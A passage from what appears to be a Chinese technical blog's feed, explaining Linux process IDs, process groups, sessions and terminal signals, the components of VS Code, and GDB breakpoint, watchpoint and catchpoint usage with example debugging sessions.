href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L944">task_struct-&gt;tgid</a> 中。</p></li><li><p>当 <code>task_struct</code> 代表一个线程时，<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L967">task_struct-&gt;group_leader</a> 指向主线程的 <code>task_struct</code>。</p></li></ul><h3 id="PGID"><a href="#PGID" class="headerlink" title="PGID"></a>PGID</h3><ul><li><p>如果 <code>shell</code> 具有作业管理能力，则它所创建的相关进程构成一个进程组，同一进程组的进程都有相同的 <strong>PGID</strong>。例如，用管道连接的进程包含在同一个进程组中。</p></li><li><p>进程组简化了向组的所有成员发送信号的操作。进程组提供了一种机制，让信号可以发送给组内的所有进程，这使得作业控制变得简单。</p></li><li><p>当 <code>task_struct</code> 代表一个进程，且该进程属于某一个进程组，则 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L967">task_struct-&gt;group_leader</a> 指向组长进程的 <code>task_struct</code>。</p></li><li><p><strong>PGID</strong> 保存在 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched/signal.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L153">task_struct-&gt;signal-&gt;pids[PIDTYPE_PGID].pid</a>中。 <code>pids[]</code> 的数组下标是枚举类型，在 <a href="https://github.com/torvalds/linux/blob/v5.15/include/linux/pid.h">include&#x2F;linux&#x2F;pid.h</a> 中定义了 <code>PID</code> 的类型：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">pid_type</span></span><br><span class="hljs-class">&#123;</span><br>PIDTYPE_PID,<br>PIDTYPE_TGID,<br>PIDTYPE_PGID,<br>PIDTYPE_SID,<br>PIDTYPE_MAX,<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>task_struce-&gt;signal</code> 是 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched/signal.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L82">signal_struct</a> 类型，维护了进程收到的信号，<code>task_struce-&gt;signal</code> 被该进程的所有线程共享。从 <strong>PGID</strong> 保存在 <code>task_struct-&gt;signal-&gt;pids[PIDTYPE_PGID]</code>中可以看出进程组和信号处理相关。</li></ul><h3 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h3><ul><li><p>用户一次登录所涉及所有活动称为一个会话（<strong>session</strong>），其间产生的所有进程都有相同的会话ID（<strong>SID</strong>），等于会话 leader 进程的  <strong>PID</strong>。</p></li><li><p><strong>SID</strong> 保存在 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched/signal.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L153">task_struct-&gt;signal-&gt;pids[PIDTYPE_SID].pid</a>中。</p></li></ul><h3 id="PID-TGID-PGID-SID总结"><a href="#PID-TGID-PGID-SID总结" class="headerlink" title="PID&#x2F;TGID&#x2F;PGID&#x2F;SID总结"></a><strong>PID&#x2F;TGID&#x2F;PGID&#x2F;SID</strong>总结</h3><p>用一幅图来总结 <strong>PID&#x2F;TGID&#x2F;PGID&#x2F;SID</strong> ：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311271428364.png" alt="进程id"></p><h2 id="进程间关系"><a href="#进程间关系" class="headerlink" title="进程间关系"></a>进程间关系</h2><p>内核中所有进程的 <code>task_struct</code> 会形成多种组织关系。根据进程的创建过程会有亲属关系，进程间的父子关系组织成一个进程树；根据用户登录活动会有会话和进程组关系。</p><h3 id="亲属关系"><a href="#亲属关系" class="headerlink" title="亲属关系"></a>亲属关系</h3><p>进程通过 <code>fork()</code> 创建出一个子进程，就形成来父子关系，如果创建出多个子进程，那么这些子进程间属于兄弟关系。可以用 <code>pstree</code> 命令查看当前系统的进程树。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">$ pstree -<span class="hljs-selector-tag">p</span><br><span class="hljs-built_in">systemd</span>(<span class="hljs-number">1</span>)─┬─<span class="hljs-built_in">ModemManager</span>(<span class="hljs-number">759</span>)─┬─&#123;ModemManager&#125;(<span class="hljs-number">802</span>)<br>           │                   └─&#123;ModemManager&#125;(<span class="hljs-number">806</span>)<br>           ├─<span class="hljs-built_in">NetworkManager</span>(<span class="hljs-number">685</span>)─┬─&#123;NetworkManager&#125;(<span class="hljs-number">743</span>)<br>           │                     └─&#123;NetworkManager&#125;(<span class="hljs-number">750</span>)<br>           ├─<span class="hljs-built_in">acpid</span>(<span class="hljs-number">675</span>)<br>           ├─<span class="hljs-built_in">agetty</span>(<span class="hljs-number">814</span>)<br>           ├─<span class="hljs-built_in">avahi-daemon</span>(<span class="hljs-number">679</span>)───<span class="hljs-built_in">avahi-daemon</span>(<span class="hljs-number">712</span>)<br>           ├─<span class="hljs-built_in">bluetoothd</span>(<span class="hljs-number">680</span>)<br>           ├─<span class="hljs-built_in">canonical-livep</span>(<span class="hljs-number">754</span>)─┬─&#123;canonical-livep&#125;(<span class="hljs-number">1224</span>)<br>           │                      ├─&#123;canonical-livep&#125;(<span class="hljs-number">1225</span>)<br>           │                      ├─&#123;canonical-livep&#125;(<span class="hljs-number">1226</span>)<br>...<br></code></pre></td></tr></table></figure><p>进程描述符 <code>task_struct</code> 的 <code>parent</code> 指向父进程，<code>children</code>指向子进程链表的头部，<code>sibling</code> 把当前进程插入到兄弟链表中。</p><p>通常情况下，<code>real_parent</code> 和 <code>parent</code> 是一样的。如果在 <code>bash</code> 上使用 <code>GDB</code> 来 debug 一个进程，这时候进程的 <code>parent</code> 是  <code>GDB</code> ，进程的 <code>real_parent</code> 是 <code>bash</code>。</p><p><img src="/image.png"></p><p>当一个进程创建了子进程后，它应该通过系统调用 <code>wait()</code> 或者 <code>waitpid()</code> 等待子进程结束，回收子进程的资源。而子进程在结束时，会向它的父进程发送 <code>SIGCHLD</code> 信号。因此父进程还可以注册 <code>SIGCHLD</code> 信号的处理函数，异步回收资源。</p><p>如果父进程提前结束，那么子进程将把1号进程 <code>init</code> 作为父进程。总之，进程都有父进程，负责进程结束后的资源回收。在子进程退出且父进程完成回收前，子进程变成僵尸进程。僵尸进程持续的时间通常比较短，在父进程回收它的资源后就会消亡。如果父进程没有处理子进程的终止，那么子进程就会一直处于僵尸状态。</p><h3 id="会话、进程组关系"><a href="#会话、进程组关系" class="headerlink" title="会话、进程组关系"></a>会话、进程组关系</h3><p>Linux 系统中可以有多个会话（<strong>session</strong>），每个会话可以包含多个进程组，每个进程组可以包含多个进程。</p><p>会话是用户登录系统到退出的所有活动，从登录到结束前创建的所有进程都属于这次会话。登录后第一个被创建的进程（通常是 <code>shell</code>），被称为 <strong>会话 leader</strong>。</p><p>进程组用于作业控制。一个终端上可以启动多个作业，也就是进程组，并能控制哪个作业在前台，前台作业可以访问终端，哪些作业运行在后台，不能读写终端。</p><p>我们来看一个会话和进程组的例子。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">cat</span> <span class="hljs-string">|</span> <span class="hljs-string">head</span><br><span class="hljs-string">hello</span><br><span class="hljs-string">hello</span><br><span class="hljs-string">^Z</span><br>[<span class="hljs-number">1</span>]<span class="hljs-string">+</span>  <span class="hljs-string">已停止</span>               <span class="hljs-string">cat</span> <span class="hljs-string">|</span> <span class="hljs-string">head</span><br><span class="hljs-string">$</span> <span class="hljs-string">ps</span> <span class="hljs-string">j</span> <span class="hljs-string">|</span> <span class="hljs-string">more</span><br>   <span class="hljs-string">PPID</span>     <span class="hljs-string">PID</span>    <span class="hljs-string">PGID</span>     <span class="hljs-string">SID</span> <span class="hljs-string">TTY</span>        <span class="hljs-string">TPGID</span> <span class="hljs-string">STAT</span>   <span class="hljs-string">UID</span>   <span class="hljs-string">TIME</span> <span class="hljs-string">COMMAND</span><br>   <span class="hljs-number">1522    </span><span class="hljs-number">1532    </span><span class="hljs-number">1532    </span><span class="hljs-number">1532 </span><span class="hljs-string">pts/0</span>       <span class="hljs-number">1762 </span><span class="hljs-string">Ss</span>    <span class="hljs-number">1000   </span><span class="hljs-number">0</span><span class="hljs-string">:00</span> <span class="hljs-string">-bash</span><br>   <span class="hljs-number">1532    </span><span class="hljs-number">1760    </span><span class="hljs-number">1760    </span><span class="hljs-number">1532 </span><span class="hljs-string">pts/0</span>       <span class="hljs-number">1762 </span><span class="hljs-string">T</span>     <span class="hljs-number">1000   </span><span class="hljs-number">0</span><span class="hljs-string">:00</span> <span class="hljs-string">cat</span><br>   <span class="hljs-number">1532    </span><span class="hljs-number">1761    </span><span class="hljs-number">1760    </span><span class="hljs-number">1532 </span><span class="hljs-string">pts/0</span>       <span class="hljs-number">1762 </span><span class="hljs-string">T</span>     <span class="hljs-number">1000   </span><span class="hljs-number">0</span><span class="hljs-string">:00</span> <span class="hljs-string">head</span><br>   <span class="hljs-number">1532    </span><span class="hljs-number">1762    </span><span class="hljs-number">1762    </span><span class="hljs-number">1532 </span><span class="hljs-string">pts/0</span>       <span class="hljs-number">1762 </span><span class="hljs-string">R+</span>    <span class="hljs-number">1000   </span><span class="hljs-number">0</span><span class="hljs-string">:00</span> <span class="hljs-string">ps</span> <span class="hljs-string">j</span><br>   <span class="hljs-number">1532    </span><span class="hljs-number">1763    </span><span class="hljs-number">1762    </span><span class="hljs-number">1532 </span><span class="hljs-string">pts/0</span>       <span class="hljs-number">1762 </span><span class="hljs-string">S+</span>    <span class="hljs-number">1000   </span><span class="hljs-number">0</span><span class="hljs-string">:00</span> <span class="hljs-string">more</span><br></code></pre></td></tr></table></figure><p>上面的命令通过 <code>cat | head</code> 创建了第一个进程组，包含 <code>cat</code> 和 <code>head </code>两个进程。这时这个作业是前台任务，可以控制终端。当我们按下 <strong>Ctrl + z</strong>，会发送信号 <strong>SIGTSTP</strong> 给前台进程组的所有进程，该信号的缺省行为是暂停作业执行。暂停的作业会让出终端，并且进程不会再被调度，直到它们收到 <strong>SIGCONT</strong> 信号恢复执行。</p><p>然后我们通过 <code>ps j | more</code> 创建了另一个进程组，包含 <code>ps</code> 和 <code>more</code> 两个进程。<code>ps</code> 的参数 <code>j</code> 表示用任务格式显示进程。输出中的 <strong>STAT</strong> 列是进程的状态码，前面的大写字母表示进程状态，我们可以从 <code>ps</code> 的 <a href="https://man7.org/linux/man-pages/man1/ps.1.html">man page</a> 查看其含义：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript">D    uninterruptible sleep (usually IO)<br>I    Idle kernel thread<br>R    <span class="hljs-built_in">running</span> <span class="hljs-keyword">or</span> runnable (<span class="hljs-keyword">on</span> <span class="hljs-built_in">run</span> queue)<br>S    interruptible sleep (waiting <span class="hljs-keyword">for</span> an event <span class="hljs-keyword">to</span> complete)<br>T    stopped <span class="hljs-keyword">by</span> job control signal<br>t    stopped <span class="hljs-keyword">by</span> debugger during <span class="hljs-keyword">the</span> tracing<br>W    paging (<span class="hljs-keyword">not</span> valid <span class="hljs-keyword">since</span> <span class="hljs-keyword">the</span> <span class="hljs-number">2.6</span>.xx kernel)<br>X    dead (should never be seen)<br>Z    defunct (<span class="hljs-string">&quot;zombie&quot;</span>) process, terminated <span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> reaped <span class="hljs-keyword">by</span> <span class="hljs-keyword">its</span> parent<br></code></pre></td></tr></table></figure><p>某些进程除了大写字母代表的进程状态，还跟着一个附加符号：</p><ul><li><strong>s</strong> ：进程是会话 leader 进程</li><li><strong>+</strong> ：进程位于前台进程组中</li></ul><p>从输出可以看出，<code>bash</code> 是这个会话的 leader 进程，它的 <strong>PID</strong>、<strong>PGID</strong> 和 <strong>SID</strong> 相同，都是<code>1532</code> 。这个会话其他所有进程的 <strong>SID</strong> 也都是 <code>1532</code>。</p><p><code>cat | head</code> 进程组的 <strong>PGID</strong> 是 <code>1760</code>，<code>ps j | more</code> 进程组的  <strong>PGID</strong> 是 <code>1762</code>。用管道连接的进程包含在同一个进程组中，每个进程组内第一个进程成为 Group Leader，并以 Group Leader 的 <strong>PID</strong> 作为组内进程的 <strong>PGID</strong>。</p><p>会话有一个前台进程组，还可以有一个或多个后台进程组，只有前台作业可以从终端读写数据。示例的进程组关系如图：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311271430513.png"></p><p>注意到上图中显示，终端设备可以向进程组发送信号。我们可以在终端输入特殊字符向前台进程发送信号：</p><ul><li><strong>Ctrl + c</strong> 发送 <strong>SIGINT</strong> 信号，默认行为是终止进程；</li><li><strong>Ctrl + \</strong> 发送 <strong>SIGQUIT</strong> 信号，默认行为是终止进程，并进行 <code>core dump</code>；</li><li><strong>Ctrl + z</strong> 发送 <strong>SIGTSTP</strong> 信号，暂停进程。</li></ul><p>只有前台进程可以从终端接收输入，也只有前台进程才被允许向终端输出。如果一个后台作业中的进程试图进行终端读写操作，终端会向整个作业发送 <strong>SIGTTOU</strong> 或 <strong>SIGTTIN</strong> 信号，默认的行为是暂停进程。</p><p>当终端关闭时，会向整个会话发送 <strong>SIGHUP</strong> 信号，通常情况下，这个会话的所有进程都会被终止。如果想让运用在后台的进程不随着 <strong>session</strong> 的结束而退出，可以使用 <strong>nohup</strong> 命令忽略 <strong>SIGHUP</strong> 信号：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> <span class="hljs-built_in">command</span> &gt;cmd.log 2&gt;&amp;1 &amp;</span><br></code></pre></td></tr></table></figure><p>即使 <code>shell</code> 结束，运行于后台的进程也能无视  <strong>SIGHUP</strong>  信号继续执行。另外一个方法是可以让进程运行在  <code>screen</code> 或 <code>tmux</code> 这种终端多路复用器（<a href="https://en.wikipedia.org/wiki/Terminal_multiplexer">terminal multiplexer</a>）中。</p><h2 id="该文章转载于"><a href="#该文章转载于" class="headerlink" title="该文章转载于"></a>该文章转载于</h2><p><a href="https://mazhen.tech/p/%E8%BF%9B%E7%A8%8Bid%E5%8F%8A%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/">https://mazhen.tech/p/%E8%BF%9B%E7%A8%8Bid%E5%8F%8A%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vscode的基本组成</title>
    <link href="/2023/11/25/vscode%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90/"/>
    <url>/2023/11/25/vscode%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90/</url>
    
    <content type="html"><![CDATA[<p>vscode的基本组成组件</p><span id="more"></span><h1 id="vscode的组成组件"><a href="#vscode的组成组件" class="headerlink" title="vscode的组成组件"></a>vscode的组成组件</h1><h2 id="Elecrton"><a href="#Elecrton" class="headerlink" title="Elecrton"></a>Elecrton</h2><p>这是一个开源的跨平台的GUI应用程序架构，也就是说其可以用来开发任意的GUI应用</p><h2 id="Monaco-Editor"><a href="#Monaco-Editor" class="headerlink" title="Monaco Editor"></a>Monaco Editor</h2><p>这是一个基于浏览器的编辑器，它包含了：智能提示、代码高亮、代码片段等等功能。</p><h2 id="LSP-Language-Server-Protocl"><a href="#LSP-Language-Server-Protocl" class="headerlink" title="LSP(Language Server Protocl)"></a>LSP(Language Server Protocl)</h2><p>语言服务器提供了诸如自动补全、定义跳转、代码格式化等等功能。</p><p>需要注意的时，LSP不是一个<strong>组件</strong>。而是编辑器与语言服务器一种协议。定义了一个语言服务和编辑器直接的协议，而语言服务能够提供自动完成、跳转定义、引用查看等功能，这个功能能让语言的支持能力和编辑器分开，所以编辑器不再需要每个语言都要开发语法解析等繁杂的功能，新出的语言也能很快的适应。</p><p><a href="https://microsoft.github.io/language-server-protocol/">官方网站</a></p><h2 id="DAP-Debug-Adapter-Protocol"><a href="#DAP-Debug-Adapter-Protocol" class="headerlink" title="DAP(Debug Adapter Protocol)"></a>DAP(Debug Adapter Protocol)</h2><p>这个是也是一个协议，其抽象了编辑器和调试器之间的通信。</p><p><a href="https://microsoft.github.io/debug-adapter-protocol//">官方网站</a></p><h2 id="Xtrem-js"><a href="#Xtrem-js" class="headerlink" title="Xtrem.js"></a>Xtrem.js</h2><p>集成终端，在vscode中我们可以使用多个终端，这就是Xtrem.js的作用。</p><h1 id="常用的快捷键"><a href="#常用的快捷键" class="headerlink" title="常用的快捷键"></a>常用的快捷键</h1><p><code>ctrl shift . </code>这个快捷键可以打开大纲,这在编写markdonw的使用很有用</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>Visual Stdio Code 权威指南</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB中的断点类型</title>
    <link href="/2023/11/25/GDB%E4%B8%AD%E7%9A%84%E6%96%AD%E7%82%B9%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/11/25/GDB%E4%B8%AD%E7%9A%84%E6%96%AD%E7%82%B9%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>GDB中的断点的类型</p><span id="more"></span><p>“源码之前，了无秘密”，阅读源码让我们清楚的了解到程序的逻辑，但对于较大的系统来说，可能会涉及到多线程、系统的状态或者无法定位到关键代码，静态的阅读可能无法掌握所有的信息，此时就需要动态调试，动态调试有助于我们对程序的理解，可以看到每一步执行状态和相应的变化。用好动态调试，可以让我们事半功倍。</p><p>Linux环境下用的最多的调试工具是gdb，设置断点可以让程序在断点处暂停，供我们查看程序的状态。gdb提供三种类型断点，代码断点(breakpoint)、内存断点(watchpoint)和事件断点(catchpoint)。</p><!--more--><h2 id="代码断点"><a href="#代码断点" class="headerlink" title="代码断点"></a>代码断点</h2><p>代码断点是最常用的，是用于设置断点到程序的特定地址，特定地址可以用代码行号、函数名、地址值等来指定，可以设置一次断点和条件断点。</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><ul><li><p>设置普通断点</p><blockquote><p>break location</p></blockquote></li><li><p>设置一次断点，也称为临时断点，断下来后会自动将该断点删除</p><blockquote><p>tbreak location</p></blockquote></li><li><p>设置条件断点，只有满足condition条件后才会断下来，condition是boolean表达式</p><blockquote><p>break location if condition</p></blockquote></li></ul><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>用下面最简单的程序来介绍如何使用普通断点和条件断点，该程序是输出0到9。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-number">2</span><br><span class="hljs-number">3</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>4 &#123;<br><span class="hljs-number">5</span>    <span class="hljs-type">int</span> i;<br><span class="hljs-number">6</span>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br><span class="hljs-number">7</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br><span class="hljs-number">8</span>    &#125;<br><span class="hljs-number">9</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">10</span> &#125;<br><br></code></pre></td></tr></table></figure><p>我们先用普通断点断到main函数上，然后条件断点断到printf所在行如果i等于8时。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">GNU gdb (Debian 8.3.1-1) 8.3.1<br>... ...<br>Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>...<br>Reading symbols from watch...<br>(gdb) b main <span class="hljs-comment"># 设置普通断点在main函数</span><br>Breakpoint 1 at 0x113d: file watch.c, line 6. <span class="hljs-comment"># 断点编号为1</span><br>(gdb) b watch.c:7 <span class="hljs-keyword">if</span> i == 8 <span class="hljs-comment"># 设置条件断点在第七行如果i==8</span><br>Breakpoint 2 at 0x1146: file watch.c, line 7. <span class="hljs-comment"># 断点编号为2</span><br>(gdb) run <span class="hljs-comment">#  运行被调试程序</span><br>Starting program: /home/f/doing/debug/gdb/watch <br><br>Breakpoint 1, main () at watch.c:6 <span class="hljs-comment"># 执行到断点1后停下来</span><br>6           <span class="hljs-keyword">for</span> (i = 0; i &lt; 10; i++) &#123;<br>(gdb) <span class="hljs-built_in">continue</span> <span class="hljs-comment"># continue是继续执行</span><br>Continuing.<br>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br><br>Breakpoint 2, main () at watch.c:7 <span class="hljs-comment"># 断点2满足条件，停下来</span><br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>(gdb) <span class="hljs-built_in">print</span> i <span class="hljs-comment"># print 查看变量值，可以看到等于8，满足我们的条件</span><br><span class="hljs-variable">$1</span> = 8<br></code></pre></td></tr></table></figure><p>从上面简单例子可以看到，设置了断点后会为每个断点分配编号，用于后续跟踪和管理。条件断点可以帮助我们过滤想要的结果。</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><p>代码断点是以代码为对象进行监控跟踪，而内存断点则是以内存为对象。对内存值进行监控，根据监控类型分为：监控内存值改变(watch)，监控内存值被读取(rwatch)和监控内存值读取或写入(awatch)。</p><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><ul><li><p>监控内存值改变</p><blockquote><p>watch expr [if condition]</p></blockquote></li><li><p>监控内存值被读取</p><blockquote><p>rwatch expr [if condition]</p></blockquote></li><li><p>监控内存值被读取和写入</p><blockquote><p>awatch expr [if condition]</p></blockquote></li></ul><div class="note note-info">            <p>expr 可以是变量也可以是表达式，但要确保有对应的内存地址，不能是常量。在使用变量时确保该变量在当前所在的上下文中。同样也可以添加if条件。</p>          </div><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p>同样用上面的例子，断点在i等于8处。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">GNU gdb (Debian 8.3.1-1) 8.3.1<br>... ...<br>Reading symbols from watch...<br>(gdb) b main <span class="hljs-comment"># 要监控变量i，由于i是在main方法中，首先要运行到main函数上下文</span><br>Breakpoint 1 at 0x113d: file watch.c, line 6.<br>(gdb) run  <span class="hljs-comment"># 执行被调试程序</span><br>Starting program: /home/f/doing/debug/gdb/watch <br><br>Breakpoint 1, main () at watch.c:6 <span class="hljs-comment"># 执行到main函数处中断</span><br>6           <span class="hljs-keyword">for</span> (i = 0; i &lt; 10; i++) &#123;<br>(gdb) watch i <span class="hljs-keyword">if</span> i == 8 <span class="hljs-comment"># 监控变量i，并让i==8时断下来</span><br>Hardware watchpoint 2: i<br>(gdb) c<br>Continuing.<br>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br><br>Hardware watchpoint 2: i<br><br>Old value = 7<br>New value = 8<br>0x0000555555555160 <span class="hljs-keyword">in</span> main () at watch.c:6 <span class="hljs-comment"># i从7更改8被断下来</span><br>6           <span class="hljs-keyword">for</span> (i = 0; i &lt; 10; i++) &#123;<br></code></pre></td></tr></table></figure><p>使用watch进行断点i，i变量实质是 *(int *)&amp;i，gdb监控的是i所在地址的四字节值，如果只想监控i的最低字节值改变，可以使用： watch *(unsigned char *)&amp;i。如果只想监控特定地址addr，该地址没有对应的变量，则需要将地址转化成需要监控长度的类型，如监控4字节，则使用： watch *(int *)addr。</p><h2 id="事件断点"><a href="#事件断点" class="headerlink" title="事件断点"></a>事件断点</h2><p>事件断点用于监听特殊事件发生，如发生则中断下来，支持的事件有：</p><ul><li>C++ exception，使用 catch exception [name]</li><li>Ada exception，使用 catch handlers [name]</li><li>exec事件， 使用 catch exec</li><li>fork事件， 使用 catch fork 或者 catch vfork</li><li>加载和卸载动态so事件， 使用 catch load|unload [regexp]</li><li>监听系统信号，使用 catch signal [signal]</li><li>监听系统调用， 使用 catch syscall [name|number|group:groupname|g:groupname] …</li></ul><p>可以看到事件断点可监听的事件较多，监听系统调用的使用场景可能较多，如查看某系统调用的参数或返回值。可以配置strace(用于监控程序所使用的系统调用)来使用。</p><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><p>有些时候我们得到了打印消息，但是不知道代码在哪里或者打印消息存在哪里，我们可以使用监听系统调用write来跟踪，还是使用上面的例子，我们来寻找打印消息的内存地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">GNU gdb (Debian 8.3.1-1) 8.3.1<br>... ...<br>Reading symbols from ./watch...<br>(gdb) b main<br>Breakpoint 1 at 0x113d: file watch.c, line 6.<br>(gdb) run<br>Starting program: /home/f/doing/debug/gdb/watch <br><br>Breakpoint 1, main () at watch.c:6<br>6           <span class="hljs-keyword">for</span> (i = 0; i &lt; 10; i++) &#123;<br>(gdb) catch syscall write <span class="hljs-comment"># 事件断点在write系统调用上</span><br>Catchpoint 2 (syscall <span class="hljs-string">&#x27;write&#x27;</span> [1])<br>(gdb) <span class="hljs-built_in">continue</span><br>Continuing.<br><br>Catchpoint 2 (call to syscall write), 0x00007ffff7ec8904 <span class="hljs-keyword">in</span> 